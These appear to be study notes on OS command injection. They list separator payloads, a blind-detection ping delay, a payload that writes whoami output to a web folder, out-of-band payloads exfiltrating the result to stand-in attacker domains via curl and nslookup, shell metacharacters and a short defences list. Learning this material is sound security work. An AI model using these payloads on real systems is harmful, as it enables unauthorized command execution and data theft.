## Command injection
- ``` & echo qwerty & ```
  - Placing & after the injected command is generally useful because it separates the injected command from whatever follows the injection point

## Blind OS command
- ### Detection
  - ``` & ping -c 10 127.0.0.1 & ```
    - 10 sec... time delay
- ### Exploit
  1)
      - Redirecting output -> (you must have write permission)
      - ``` & whoami > /var/www/static/whoami.txt & ```
      - ``` curl https://website.com/whoami.txt ```
  2)
      - Out-of-band techniques
      - ``` & curl `whoami`.webserver-attacker.com & ``` (HTTP traffic may be blocked)
      - ```& nslookup `whoami`.kgji2ohoyw.web-attacker.com &```

## Bypass restriction
- There are so many ways ...
  - https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions

## Metacharacters
- Windows & Unix
  - &
  - &&
  - |
  - ||
- Unix
  - ;
- Unix inline execution 
  - \`command\`
  - $(command)

## Defences
- Whitelist of permitted values
- Validating that the input is a number
- Validating that the input contains only alphanumeric characters, no other syntax or whitespace
- Never attempt to sanitize input by escaping shell metacharacters
